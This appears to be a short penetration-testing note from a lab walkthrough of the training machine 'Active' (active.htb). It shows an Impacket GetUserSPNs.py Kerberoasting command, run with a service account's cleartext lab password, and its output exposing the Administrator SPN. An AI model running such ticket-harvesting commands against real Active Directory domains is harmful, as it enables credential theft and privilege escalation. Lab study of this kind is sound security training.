---
id: 105c91d7-3641-446c-a495-6b3d6c88d229
name: Get User SPNs
type: command
executor: bash
data: "$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100\
  \ -request\n\nImpacket v0.9.17 - Copyright 2002-2018 Core Security Technologies\n\
  \nServicePrincipalName  Name           MemberOf                                \
  \                  PasswordLastSet      LastLogon           \n--------------------\
  \  -------------  --------------------------------------------------------  -------------------\
  \  -------------------\nactive/CIFS:445       Administrator  CN=Group Policy Creator\
  \ Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 \n\n"
output: null
created_at: '2023-04-06T03:56:04.929241+00:00'
updated_at: '2023-04-10T20:26:35.046009+00:00'
---

# Get User SPNs

```bash
$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 


```


